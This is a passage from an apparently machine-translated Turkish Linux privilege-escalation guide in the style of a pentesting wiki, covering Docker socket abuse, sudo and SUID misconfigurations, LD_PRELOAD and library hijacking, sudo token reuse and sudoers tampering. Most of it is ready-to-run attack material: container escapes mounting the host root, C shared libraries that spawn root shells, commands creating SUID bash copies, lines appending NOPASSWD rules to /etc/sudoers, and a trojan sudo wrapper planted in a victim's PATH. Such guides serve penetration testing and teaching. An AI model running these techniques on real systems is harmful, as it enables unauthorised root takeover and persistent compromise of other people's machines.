Docker socket, genellikle `/var/run/docker.sock` konumunda bulunan, korunması gereken kritik bir dosyadır. Varsayılan olarak, `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu socket'e yazma erişimine sahip olmak privilege escalation'a yol açabilir. Aşağıda bunun nasıl yapılabileceğinin ve Docker CLI kullanılamıyorsa alternatif yöntemlerin bir dökümü yer almaktadır.

#### **Privilege Escalation with Docker CLI**

Eğer Docker socket'e yazma erişiminiz varsa, aşağıdaki komutları kullanarak escalate privileges yapabilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Using Docker API Directly**

In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and `curl` commands.

1.  **List Docker Images:** Mevcut imajların listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Host sisteminin root dizinini mount eden bir container oluşturmak için istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` kullanarak container'a bağlantı kurun ve içinde komut çalıştırmanıza imkan verin.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.

### Diğerleri

Note that if you have write permissions over the docker socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Şunlara bakın: **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus is a sophisticated **işlemlerarası iletişim (IPC) sistemi** that enables applications to efficiently interact and share data. Designed with the modern Linux system in mind, it offers a robust framework for different forms of application communication.

The system is versatile, supporting basic IPC that enhances data exchange between processes, reminiscent of **enhanced UNIX domain sockets**. Moreover, it aids in broadcasting events or signals, fostering seamless integration among system components. For instance, a signal from a Bluetooth daemon about an incoming call can prompt a music player to mute, enhancing user experience. Additionally, D-Bus supports a remote object system, simplifying service requests and method invocations between applications, streamlining processes that were traditionally complex.

D-Bus operates on an **allow/deny model**, managing message permissions (method calls, signal emissions, etc.) based on the cumulative effect of matching policy rules. These policies specify interactions with the bus, potentially allowing for privilege escalation through the exploitation of these permissions.

An example of such a policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` is provided, detailing permissions for the root user to own, send to, and receive messages from `fi.w1.wpa_supplicant1`.

Policies without a specified user or group apply universally, while "default" context policies apply to all not covered by other specific policies.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini burada nasıl enumerate ve exploit edeceğinizi öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin ağdaki konumunu belirlemek her zaman ilginçtir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Açık portlar

Erişmeden önce, daha önce etkileşim kuramadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Trafiği sniff edip edemeyeceğinizi kontrol edin. Eğer yapabiliyorsanız, bazı kimlik bilgilerini ele geçirebilirsiniz.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Generic Enumeration

Kontrol edin: **kim** olduğunuzu, hangi **yetkilere** sahip olduğunuzu, sistemde hangi **kullanıcıların** bulunduğunu, hangilerinin **login** olabildiğini ve hangilerinin **root privileges** olduğunu:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların privilege escalation yapmasına izin veren bir hatadan etkilendi. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

Sistemde root privileges verebilecek bir **grubun üyesi** olup olmadığınızı kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Mümkünse panoda ilginç bir şey olup olmadığını kontrol edin
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Ortamın herhangi bir parolasını **biliyorsanız**, parolayı kullanarak **her kullanıcıyla oturum açmayı deneyin**.

### Su Brute

Eğer çok gürültü çıkarmayı umursamıyorsanız ve `su` ve `timeout` ikili dosyaları bilgisayarda mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıya brute-force uygulamayı deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile ayrıca kullanıcılar üzerinde brute-force denemesi de yapar.

## Yazılabilir PATH istismarları

### $PATH

Eğer $PATH içindeki bir klasöre **yazma yetkiniz olduğunu** fark ederseniz, yazılabilir klasörün içine, farklı bir kullanıcı (idealde root) tarafından çalıştırılacak bir komutun adıyla bir **backdoor** oluşturarak ayrıcalıkları yükseltebilirsiniz; bunun çalışması için söz konusu komutun $PATH'te yazılabilir klasörünüzden **önce yer alan bir klasörden yüklenmemesi** gerekir.

### SUDO and SUID

Bazı komutları sudo ile çalıştırmaya izinli olabilirsiniz veya dosyalar suid biti setlenmiş olabilir. Bunu şu şekilde kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosyaları okumanıza ve/veya yazmanıza veya hatta bir komut çalıştırmanıza izin verebilir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının parola girmeden başka bir kullanıcının ayrıcalıklarıyla bazı komutları çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo` `vim`'i `root` olarak çalıştırabiliyor; artık root dizinine bir ssh key ekleyerek veya `sh` çağırarak bir shell elde etmek oldukça kolay.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, kullanıcının bir şey çalıştırırken bir **environment variable** ayarlamasına izin verir:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer'e dayanan**, script root olarak çalıştırılırken rastgele bir python kütüphanesini yüklemek için **PYTHONPATH hijacking**'e **savunmasızdı**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Neden işe yarar: Etkileşimli olmayan shell'lerde Bash, hedef script'i çalıştırmadan önce `$BASH_ENV`'i değerlendirir ve o dosyayı source eder. Birçok sudo kuralı bir script veya shell wrapper çalıştırmaya izin verir. `BASH_ENV` sudo tarafından korunduysa, dosyanız root ayrıcalıklarıyla source edilir.

- Gereksinimler:
- Çalıştırabileceğiniz bir sudo kuralı (etkileşimli olmayan şekilde `/bin/bash` çağıran herhangi bir hedef veya herhangi bir bash script).
- `BASH_ENV`'in `env_keep` içinde olması (`sudo -l` ile kontrol edin).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `env_keep` içinden `BASH_ENV` (ve `ENV`) kaldırın, `env_reset` tercih edin.
- sudo-allowed komutlar için shell wrapper'larından kaçının; mümkün olduğunca minimal binaries kullanın.
- Korunan env vars kullanıldığında sudo I/O logging ve alerting'i düşünün.

### sudo üzerinden korunmuş HOME ile Terraform (!env_reset)

Eğer sudo ortamı olduğu gibi bırakıyorsa (`!env_reset`) ve `terraform apply`'e izin veriyorsa, `$HOME` çağıran kullanıcıya ait kalır. Bu nedenle Terraform root olarak **$HOME/.terraformrc** dosyasını yükler ve `provider_installation.dev_overrides`'u dikkate alır.

- Gerekli provider'ı yazılabilir bir dizine yönlendirin ve provider adıyla aynı olan kötü amaçlı bir plugin bırakın (ör. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform Go plugin handshake'ini başarısız kılar, ancak ölmeden önce payload'ı root olarak çalıştırır ve geride bir SUID shell bırakır.

### TF_VAR overrides + symlink doğrulama atlatma

Terraform değişkenleri `TF_VAR_<name>` environment variables aracılığıyla sağlanabilir; sudo ortamı koruduğunda bunlar korunur. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` gibi zayıf doğrulamalar symlink'lerle atlatılabilir:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform symlink'i çözer ve gerçek `/root/root.txt` dosyasını saldırganın okuyabileceği bir hedefe kopyalar. Aynı yöntem, hedef symlink'leri önceden oluşturarak (ör. sağlayıcının hedef yolunu `/etc/cron.d/` içine yönlendirerek) ayrıcalıklı yolların içine **yazmak** için kullanılabilir.

### requiretty / !requiretty

Bazı eski dağıtımlarda sudo `requiretty` ile yapılandırılabilir; bu, sudo'nun yalnızca etkileşimli bir TTY'den çalışmasını zorunlu kılar. Eğer `!requiretty` ayarlıysa (veya seçenek yoksa), sudo reverse shells, cron jobs veya scripts gibi etkileşimsiz bağlamlardan çalıştırılabilir.
```bash
Defaults !requiretty
```
This is not a direct vulnerability by itself, but it expands the situations where sudo rules can be abused without needing a full PTY.

### Sudo env_keep+=PATH / güvensiz secure_path → PATH hijack

If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.

- Gereksinimler: sudo kuralı (çoğunlukla `NOPASSWD`) bir script/binary çalıştırıyor olmalı; bu script/binary komutları mutlak yollarla (`free`, `df`, `ps`, vb.) çağırmamalı ve ilk aranan yazılabilir bir PATH girdisi bulunmalı.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo yürütme atlatma yolları
**Jump** ile diğer dosyaları okuyun veya **symlinks** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılırsa (\*), iş daha da kolaylaşır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo komutu/SUID ikili dosyası komut yolu belirtilmeden

Eğer **sudo izni** tek bir komuta **komut yolu belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bunu exploit edebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** ikili dosya **başka bir komutu çalıştırırken yolunu belirtmiyorsa (her zaman garip bir SUID ikili dosyasının içeriğini _**strings**_ ile kontrol edin)** için de kullanılabilir.

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu olan SUID binary

Eğer **suid** ikili dosya **çağırdığı komutun yolunu belirterek başka bir komut çalıştırıyorsa**, suid dosyasının çağırdığı komutla aynı ada sahip bir fonksiyon oluşturup bunu **export etmeyi** deneyebilirsiniz.

Örneğin, eğer bir suid ikili dosyası _**/usr/sbin/service apache2 start**_ çağırıyorsa, o fonksiyonu oluşturup export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonra, suid binary'yi çağırdığınızda bu fonksiyon yürütülecektir

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

Ancak, sistemi güvenli tutmak ve bu özelliğin özellikle **suid/sgid** yürütülebilir dosyalar için kötüye kullanılmasını engellemek amacıyla sistem bazı koşullar uygular:

- Loader, gerçek kullanıcı kimliği (_ruid_) ile etkili kullanıcı kimliği (_euid_) eşleşmeyen yürütülebilirlerde **LD_PRELOAD**'u göz ardı eder.
- suid/sgid yürütülebilirlerde, yalnızca standart yollar içindeki ve kendileri de suid/sgid olan kütüphaneler önceden yüklenir.

Ayrıcalık yükseltmesi, `sudo` ile komut çalıştırma yetkiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa gerçekleşebilir. Bu yapılandırma, **LD_PRELOAD** ortam değişkeninin `sudo` ile komutlar çalıştırıldığında bile korunmasına ve tanınmasına izin verir; bu da yükseltilmiş ayrıcalıklarla rastgele kod yürütülmesine yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Şu isimle kaydedin: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Sonra **bunu derleyin** kullanarak:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırarak
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env variable'ını kontrol ediyorsa kötüye kullanılabilir; çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Normal olmayan **SUID** izinlerine sahip bir binary ile karşılaştığınızda, **.so** dosyalarını doğru şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komutu çalıştırarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hatayla karşılaşmak, istismar için potansiyel olduğunu gösterir.

Bunu istismar etmek için, aşağıdaki kodu içeren, örneğin _"/path/to/.config/libcalc.c"_ adlı bir C dosyası oluşturmak gerekir:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlendikten ve çalıştırıldıktan sonra, dosya izinlerini değiştirerek ve yükseltilmiş ayrıcalıklarla bir shell çalıştırarak yetki yükseltmeyi amaçlar.

Yukarıdaki C dosyasını shared object (.so) dosyasına şu komutla derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'nin çalıştırılması exploit'i tetiklemeli ve potansiyel olarak sistemin ele geçirilmesine yol açmalıdır.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Yazabileceğimiz bir klasörden kütüphane yükleyen bir SUID binary bulduğumuza göre, gerekli isimle kütüphaneyi o klasöre oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Aşağıdaki gibi bir hata alırsanız:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyon içermesi gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) bir saldırganın yerel güvenlik kısıtlamalarını aşmak için kötüye kullanabileceği Unix ikili dosyalarının özenle seçilmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) aynı şeydir ancak bir komutta **yalnızca argüman enjekte edebildiğiniz** durumlar için.

Proje, kısıtlı shell'lerden çıkmak, ayrıcalıkları yükseltmek veya sürdürmek, dosya aktarmak, bind and reverse shells oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilecek Unix ikili dosyalarının meşru fonksiyonlarını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l`'ye erişebiliyorsanız, herhangi bir sudo kuralını nasıl istismar edeceğini bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Sudo Token'larını Yeniden Kullanma

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Ayrıcalıkları yükseltmek için gereksinimler:

- Zaten `_sampleuser_` kullanıcısı olarak bir shell'e sahipsiniz
- `_sampleuser_` son 15 dakika içinde bir şey çalıştırmak için **`sudo` kullanmış** olmalıdır (varsayılan olarak bu, parolayı girmeden `sudo` kullanmamıza izin veren sudo token'ının süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` değeri 0 olmalı
- `gdb` erişilebilir olmalı (yükleyebilmeniz mümkün olmalı)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` olarak ayarlayabilirsiniz)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **ikinci exploit** (`exploit_v2.sh`) _/tmp_ içinde **root tarafından sahip olunan ve setuid bitine sahip** bir sh shell oluşturacaktır
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Bu **third exploit** (`exploit_v3.sh`) **create a sudoers file** oluşturacak; bu da **sudo tokens eternal and allows all users to use sudo** sağlayacak
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Klasörde veya klasör içindeki oluşturulan dosyalardan herhangi birinde **write permissions**'a sahipseniz, ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) kullanarak bir kullanıcı ve PID için **sudo token** oluşturabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını overwrite edebiliyor ve o kullanıcı olarak PID 1234 ile bir shell'e sahipseniz, şifreyi bilmenize gerek kalmadan aşağıdaki şekilde **obtain sudo privileges** elde edebilirsiniz:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar, kimin `sudo` kullanabileceğini ve nasıl kullanacağını belirler. Bu dosyalar **varsayılan olarak yalnızca kullanıcı root ve grup root tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı ilginç bilgileri **elde edebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** ayrıcalıkları **yükseltebilirsiniz**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazabiliyorsanız bu izni kötüye kullanabilirsiniz
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın bir başka yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD için `doas` gibi `sudo` binary olan bazı alternatifler vardır; yapılandırmasını `/etc/doas.conf`'ta kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcının genellikle bir makinaya bağlanıp ayrıcalıkları yükseltmek için `sudo` kullandığını** ve o kullanıcı bağlamında bir shell elde ettiğinizi biliyorsanız, kodunuzu root olarak çalıştırıp ardından kullanıcının komutunu yürütecek **yeni bir sudo yürütülebilir dosyası oluşturabilirsiniz**. Sonra, kullanıcı bağlamının **$PATH**'ini değiştirin (örneğin yeni yolu .bash_profile içine ekleyerek), böylece kullanıcı sudo çalıştırdığında sizin sudo yürütülebilir dosyanız çalışır.

Not: kullanıcı farklı bir shell (not bash) kullanıyorsa yeni yolu eklemek için diğer dosyaları değiştirmeniz gerekecektir. Örneğin[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Veya şöyle bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

Dosya `/etc/ld.so.conf` yüklenen yapılandırma dosyalarının **nereden geldiğini** gösterir. Genellikle bu dosya aşağıdaki yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları **diğer klasörlere işaret eder**; bu klasörlerde **kütüphaneler** **aranacaktır**. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'tür. **Bu, sistemin kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir.**

Eğer bir kullanıcı gösterilen yollardan herhangi birinde **yazma izinlerine** sahipse: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasının işaret ettiği herhangi bir klasör, ayrıcalıkları yükseltebilir.\
Bu yanlış yapılandırmanın **nasıl istismar edileceğine** aşağıdaki sayfadan bakın:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kütüphaneyi `/var/tmp/flag15/` dizinine kopyaladığınızda, `RPATH` değişkeninde belirtildiği üzere program tarafından bu konumda kullanılacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Sonra `/var/tmp` dizininde şu kötü amaçlı kütüphaneyi oluşturun: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux yetkileri bir sürece mevcut root ayrıcalıklarının **alt kümesini sağlar**. Bu, root **ayrıcalıklarını daha küçük ve ayrı birimlere** böler. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Böylece tam ayrıcalık seti azaltılır ve istismar riskleri düşer.\
Aşağıdaki sayfayı **yetkiler ve bunların nasıl suistimal edileceği hakkında daha fazlasını öğrenmek için** okuyun:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **"execute" biti** etkilenen kullanıcının **"cd"** ile klasöre girebileceği anlamına gelir.\
**"read"** biti kullanıcının **dosyaları** **listeleyebileceği**, ve **"write"** biti kullanıcının **dosyaları** **silip** ve **yeni dosyalar oluşturabileceği** anlamına gelir.

## ACLs

